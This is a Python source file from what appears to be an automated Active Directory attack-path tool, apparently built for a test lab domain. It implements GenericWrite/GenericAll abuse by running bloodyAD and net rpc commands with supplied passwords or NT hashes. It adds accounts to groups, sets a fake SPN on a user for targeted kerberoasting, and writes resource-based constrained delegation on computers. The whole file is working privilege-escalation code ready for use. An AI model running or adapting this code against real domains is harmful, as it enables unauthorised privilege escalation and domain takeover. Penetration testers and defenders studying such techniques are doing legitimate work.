# strategies/generic_write.py

import subprocess
import shutil
from dataclasses import dataclass, field
from typing import ClassVar

from .exploit_strategy import ExploitStrategy
from entities.edge import Edge
from entities.node import Node
from entities.node_kind import NodeKind
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind
from exceptions.hop_failed_error import HopFailedError
from services.printing import print_check, print_warning, print_error, print_done


@dataclass
class GenericWriteStrategy(ExploitStrategy):
    """
    Handles GenericWrite / GenericAll edges depending on target kind:
      - User     → shadow credentials / targeted kerberoast
      - Group    → AddMember
      - Computer → RBCD (Resource-Based Constrained Delegation)

    Requires (Linux): bloodyAD  OR  impacket suite
    """

    edge:   Edge
    victim: Node                            # compte à faire progresser

    # Tools détectés une seule fois au niveau classe
    _BLOODYAD:  ClassVar[str | None] = shutil.which("bloodyAD")
    _NET_RPC:   ClassVar[str | None] = shutil.which("net")
    _IMPACKET:  ClassVar[str | None] = shutil.which("impacket-addcomputer")

    # ── Properties dérivées ───────────────────────────────────────────────────

    @property
    def attacker(self) -> Node:
        return self.edge.source_node

    @property
    def target(self) -> Node:
        return self.edge.goal_node

    # ── Interface ExploitStrategy ─────────────────────────────────────────────

    def can_exploit(self) -> bool:
        return self.edge.kind in {
            EdgeKind.GENERIC_WRITE,
            EdgeKind.GENERIC_ALL,
        }

    def exploit(self, creds: dict) -> ExploitResult:
        print_check(
            f"GenericWrite: {self.attacker.label} ──[{self.edge.kind.value}]──▶ {self.target.label}"
        )

        match self.target.kind:
            case NodeKind.GROUP:
                return self._add_member(creds)
            case NodeKind.USER:
                return self._targeted_kerberoast(creds)
            case NodeKind.COMPUTER:
                return self._rbcd(creds)
            case _:
                raise HopFailedError(
                    self.edge,
                    f"GenericWrite on {self.target.kind.value} — no known technique"
                )

    # ── Techniques ────────────────────────────────────────────────────────────

    def _add_member(self, creds: dict) -> ExploitResult:
        """AddMember : ajoute self.victim dans self.target (Group)."""
        group_sam  = _sam(self.target.label)
        victim_sam = _sam(self.victim.label)

        cmd = _build_bloodyad_cmd(creds, [
            "add", "groupMember", group_sam, victim_sam
        ])

        ok, output = _run(cmd)
        if ok:
            print_done(f"{victim_sam} added to {group_sam}")
            return ExploitResult(success=True, output=output, technique="AddMember")

        # Fallback net rpc
        if self._NET_RPC:
            print_warning("bloodyAD failed — trying net rpc fallback")
            cmd2 = [
                "net", "rpc", "group", "addmem", group_sam, victim_sam,
                "-U", f"{creds['domain']}/{creds['username']}%{creds['password']}",
                "-S", creds["dc_ip"],
            ]
            ok2, output2 = _run(cmd2)
            if ok2:
                print_done(f"{victim_sam} added via net rpc")
                return ExploitResult(success=True, output=output2, technique="AddMember/netrpc")

        raise HopFailedError(self.edge, f"AddMember failed:\n{output}")

    def _targeted_kerberoast(self, creds: dict) -> ExploitResult:
        """GenericWrite on User → set SPN → kerberoast."""
        target_sam = _sam(self.target.label)

        cmd = _build_bloodyad_cmd(creds, [
            "set", "object", target_sam,
            "--attribute", "servicePrincipalNames",
            "--value",     f"fake/roast.{creds['domain']}"
        ])

        ok, output = _run(cmd)
        if not ok:
            raise HopFailedError(self.edge, f"SPN write failed:\n{output}")

        print_done(f"SPN set on {target_sam} — ready to Kerberoast")
        return ExploitResult(success=True, output=output, technique="TargetedKerberoast")

    def _rbcd(self, creds: dict) -> ExploitResult:
        """GenericWrite on Computer → write msDS-AllowedToActOnBehalfOfOtherIdentity."""
        target_sam = _sam(self.target.label)
        attacker_sam = _sam(self.attacker.label)

        cmd = _build_bloodyad_cmd(creds, [
            "add", "rbcd", target_sam, attacker_sam
        ])

        ok, output = _run(cmd)
        if not ok:
            raise HopFailedError(self.edge, f"RBCD write failed:\n{output}")

        print_done(f"RBCD set: {attacker_sam} can delegate to {target_sam}")
        return ExploitResult(success=True, output=output, technique="RBCD")


# ── Helpers module-level (pas de self, réutilisables) ─────────────────────────

def _sam(label: str) -> str:
    """'DOMAIN ADMINS@SEVENKINGDOMS.LOCAL' → 'DOMAIN ADMINS'"""
    return label.split("@")[0]


def _build_bloodyad_cmd(creds: dict, subcommand: list[str]) -> list[str]:
    cmd = [
        "bloodyAD",
        "--host", creds["dc_ip"],
        "-d",     creds["domain"],
        "-u",     creds["username"],
    ]
    if pw := creds.get("password"):
        cmd += ["-p", pw]
    elif nt := creds.get("hashes"):          # format LM:NT
        cmd += ["--hashes", nt]
    return cmd + subcommand


def _run(cmd: list[str], timeout: int = 30) -> tuple[bool, str]:
    """Lance une commande, retourne (success, stdout+stderr)."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        output = (r.stdout + r.stderr).strip()
        return r.returncode == 0, output
    except FileNotFoundError:
        return False, f"Command not found: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return False, "Timeout"